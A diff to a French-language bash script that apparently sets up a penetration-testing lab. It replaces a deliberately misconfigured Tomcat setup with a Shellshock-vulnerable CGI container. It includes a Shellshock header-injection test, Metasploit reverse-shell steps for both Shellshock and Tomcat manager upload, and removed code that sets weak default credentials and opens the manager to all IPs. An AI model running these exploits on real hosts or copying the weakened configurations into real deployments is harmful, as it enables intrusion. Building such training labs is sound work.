@@ -2,7 +2,8 @@
 set -e
 
 echo "================================================"
-echo "  TOMCAT FINAL - Ça va marcher"
+echo "  SHELLSHOCK (CVE-2014-6271)"
+echo "  Bash Environment Variable RCE"
 echo "================================================"
 echo ""
 
@@ -13,146 +14,109 @@ fi
 
 SERVER_IP=$(hostname -I | awk '{print $1}')
 
-# Nettoyage TOTAL
-echo "[*] Nettoyage complet..."
-docker stop tomcat-vuln phpmyadmin-vuln struts2-vuln webmin-vuln 2>/dev/null || true
-docker rm tomcat-vuln phpmyadmin-vuln struts2-vuln webmin-vuln 2>/dev/null || true
+# ========================================
+# NETTOYAGE COMPLET
+# ========================================
 
-# ================================================
-# TEST 1 : saravak/tomcat8 (Manager activé)
-# ================================================
+echo "[1/4] Nettoyage total..."
+docker stop tomcat-vuln phpmyadmin-vuln struts2-vuln webmin-vuln dvwa-vuln shellshock-vuln 2>/dev/null || true
+docker rm tomcat-vuln phpmyadmin-vuln struts2-vuln webmin-vuln dvwa-vuln shellshock-vuln 2>/dev/null || true
+echo "   ✅ Nettoyage terminé"
+
+# ========================================
+# INSTALLATION SHELLSHOCK
+# ========================================
+
+echo "[2/4] Installation Shellshock..."
+docker pull vulnerables/cgi-bin
+
+echo "[3/4] Lancement container (port 8080)..."
+docker run -d \
+    --name shellshock-vuln \
+    --restart unless-stopped \
+    -p 8080:80 \
+    vulnerables/cgi-bin
+
+echo "[4/4] Vérification (10 secondes)..."
+sleep 10
+
+# Vérifier que le container tourne
+if ! docker ps | grep -q shellshock-vuln; then
+    echo "❌ Container non actif"
+    docker logs shellshock-vuln
+    exit 1
+fi
+
+# Vérifier l'accès HTTP
+HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:8080/ 2>/dev/null)
+
+if [ "$HTTP_CODE" != "200" ]; then
+    echo "⚠️  HTTP $HTTP_CODE (peut être normal)"
+fi
+
+# Test Shellshock manuel
+TEST=$(curl -s -A "() { :; }; echo vulnerable" http://localhost:8080/cgi-bin/shock.cgi 2>/dev/null | grep -o vulnerable || echo "")
 
 echo ""
-echo "[TEST 1/3] saravak/tomcat8..."
+echo "================================================"
+echo "  ✅ SHELLSHOCK INSTALLÉ !"
+echo "================================================"
+echo ""
+docker ps | grep shellshock
+echo ""
+echo "📊 Configuration:"
+echo "   Vulnérabilité: Shellshock (CVE-2014-6271)"
+echo "   Container: vulnerables/cgi-bin"
+echo "   Port: 8080"
+echo "   URL: http://${SERVER_IP}:8080/"
+echo "   Script CGI: /cgi-bin/shock.cgi"
 
-if docker pull saravak/tomcat8 2>/dev/null; then
-    docker run -d --name tomcat-vuln -p 8080:8080 saravak/tomcat8
-    sleep 15
-    
-    HTTP=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:8080/manager/html 2>/dev/null)
-    
-    if [ "$HTTP" = "401" ] || [ "$HTTP" = "200" ]; then
-        echo "   ✅ SUCCÈS - Tomcat Manager actif !"
-        echo ""
-        echo "METASPLOIT:"
-        echo "use exploit/multi/http/tomcat_mgr_upload"
-        echo "set RHOSTS ${SERVER_IP}"
-        echo "set RPORT 8080"
-        echo "set HttpUsername admin"
-        echo "set HttpPassword admin"
-        echo "set LHOST 192.168.100.10"
-        echo "exploit"
-        exit 0
-    fi
-    
-    docker stop tomcat-vuln && docker rm tomcat-vuln
-fi
-
-# ================================================
-# TEST 2 : tutum/tomcat:8.0 (Manager activé)
-# ================================================
-
-echo "[TEST 2/3] tutum/tomcat:8.0..."
-
-if docker pull tutum/tomcat:8.0 2>/dev/null; then
-    docker run -d --name tomcat-vuln -p 8080:8080 tutum/tomcat:8.0
-    sleep 15
-    
-    HTTP=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:8080/manager/html 2>/dev/null)
-    
-    if [ "$HTTP" = "401" ] || [ "$HTTP" = "200" ]; then
-        echo "   ✅ SUCCÈS - Tomcat Manager actif !"
-        
-        # Récupérer les credentials depuis les logs
-        CREDS=$(docker logs tomcat-vuln 2>&1 | grep -E "admin|tomcat" | head -1)
-        
-        echo ""
-        echo "METASPLOIT:"
-        echo "use exploit/multi/http/tomcat_mgr_upload"
-        echo "set RHOSTS ${SERVER_IP}"
-        echo "set RPORT 8080"
-        echo "set HttpUsername admin"
-        echo "set HttpPassword admin"
-        echo "set LHOST 192.168.100.10"
-        echo "exploit"
-        echo ""
-        echo "Credentials: Vérifier dans les logs si échec"
-        echo "docker logs tomcat-vuln | grep -i password"
-        exit 0
-    fi
-    
-    docker stop tomcat-vuln && docker rm tomcat-vuln
-fi
-
-# ================================================
-# TEST 3 : BUILD CUSTOM (Garanti à 100%)
-# ================================================
-
-echo "[TEST 3/3] Build Tomcat custom..."
-
-cat > /tmp/Dockerfile.tomcat << 'EOF'
-FROM tomcat:8.5-jre8
-
-# Copier les webapps par défaut (dont Manager)
-RUN cp -r /usr/local/tomcat/webapps.dist/* /usr/local/tomcat/webapps/
-
-# Créer tomcat-users.xml avec credentials
-RUN echo '<?xml version="1.0" encoding="UTF-8"?>' > /usr/local/tomcat/conf/tomcat-users.xml && \
-    echo '<tomcat-users>' >> /usr/local/tomcat/conf/tomcat-users.xml && \
-    echo '  <role rolename="manager-gui"/>' >> /usr/local/tomcat/conf/tomcat-users.xml && \
-    echo '  <role rolename="manager-script"/>' >> /usr/local/tomcat/conf/tomcat-users.xml && \
-    echo '  <role rolename="manager-jmx"/>' >> /usr/local/tomcat/conf/tomcat-users.xml && \
-    echo '  <role rolename="manager-status"/>' >> /usr/local/tomcat/conf/tomcat-users.xml && \
-    echo '  <user username="tomcat" password="tomcat" roles="manager-gui,manager-script,manager-jmx,manager-status"/>' >> /usr/local/tomcat/conf/tomcat-users.xml && \
-    echo '</tomcat-users>' >> /usr/local/tomcat/conf/tomcat-users.xml
-
-# Autoriser accès Manager depuis toutes les IPs
-RUN sed -i 's/<Valve className="org.apache.catalina.valves.RemoteAddrValve"/<!--<Valve className="org.apache.catalina.valves.RemoteAddrValve"/' /usr/local/tomcat/webapps/manager/META-INF/context.xml && \
-    sed -i 's|allow="127\\.\d+\\.\d+\\.\d+\|::1\|0:0:0:0:0:0:0:1" />|allow=".*" />-->|' /usr/local/tomcat/webapps/manager/META-INF/context.xml
-
-EXPOSE 8080
-CMD ["catalina.sh", "run"]
-EOF
-
-echo "   Building custom Tomcat (2 minutes)..."
-docker build -t tomcat-custom -f /tmp/Dockerfile.tomcat /tmp/ 2>&1 | tail -5
-
-docker run -d --name tomcat-vuln -p 8080:8080 tomcat-custom
-sleep 15
-
-HTTP=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:8080/manager/html 2>/dev/null)
-
-if [ "$HTTP" = "401" ] || [ "$HTTP" = "200" ]; then
-    echo "   ✅ SUCCÈS - Tomcat custom avec Manager !"
-    
-    rm -f /tmp/Dockerfile.tomcat
-    
-    echo ""
-    echo "================================================"
-    echo "  ✅ TOMCAT PRÊT POUR EXPLOITATION !"
-    echo "================================================"
-    echo ""
-    docker ps | grep tomcat
-    echo ""
-    echo "URL Manager: http://${SERVER_IP}:8080/manager/html"
-    echo "Credentials: tomcat / tomcat"
-    echo ""
-    echo "================================================"
-    echo "  🔥 METASPLOIT"
-    echo "================================================"
-    echo ""
-    echo "use exploit/multi/http/tomcat_mgr_upload"
-    echo "set RHOSTS ${SERVER_IP}"
-    echo "set RPORT 8080"
-    echo "set HttpUsername tomcat"
-    echo "set HttpPassword tomcat"
-    echo "set LHOST 192.168.100.10"
-    echo "set LPORT 4444"
-    echo "exploit"
-    echo ""
-    exit 0
+if [ -n "$TEST" ]; then
+    echo "   Status: ✅ VULNÉRABLE (test manuel OK)"
+else
+    echo "   Status: ⚠️  À vérifier avec Metasploit"
 fi
 
 echo ""
-echo "❌ ÉCHEC TOTAL - Aucune solution Tomcat n'a marché"
+echo "================================================"
+echo "  🔥 EXPLOITATION METASPLOIT"
+echo "================================================"
+echo ""
+echo "DEPUIS KALI:"
+echo ""
+echo "msfconsole -q"
+echo "use exploit/multi/http/apache_mod_cgi_bash_env_exec"
+echo "set RHOSTS ${SERVER_IP}"
+echo "set RPORT 8080"
+echo "set TARGETURI /cgi-bin/shock.cgi"
+echo "set LHOST 192.168.100.10"
+echo "set LPORT 4444"
+echo "check"
+echo "exploit"
+echo ""
+echo "ALTERNATIVE SI ÉCHEC:"
+echo "set TARGETURI /cgi-bin/test.cgi"
+echo "exploit"
+echo ""
+echo "================================================"
+echo "  📖 SCÉNARIO LAB"
+echo "================================================"
+echo ""
+echo "Iron4Software utilise des scripts CGI pour:"
+echo "- Monitoring serveur mail (stats temps réel)"
+echo "- Consultation logs Postfix/Dovecot"
+echo "- Alertes système automatiques"
+echo "- Interface web admin basique"
+echo ""
+echo "CVE-2014-6271 (Shellshock):"
+echo "Bash vulnérable permet l'injection de code"
+echo "via variables d'environnement HTTP (User-Agent,"
+echo "Cookie, Referer, etc.)"
+echo ""
+echo "Impact: RCE avec privilèges du serveur web"
+echo "MITRE ATT&CK: T1190 (Exploit Public-Facing App)"
+echo ""
+echo "================================================"
+echo "  ✅ PRÊT POUR EXPLOITATION"
+echo "================================================"
 echo ""
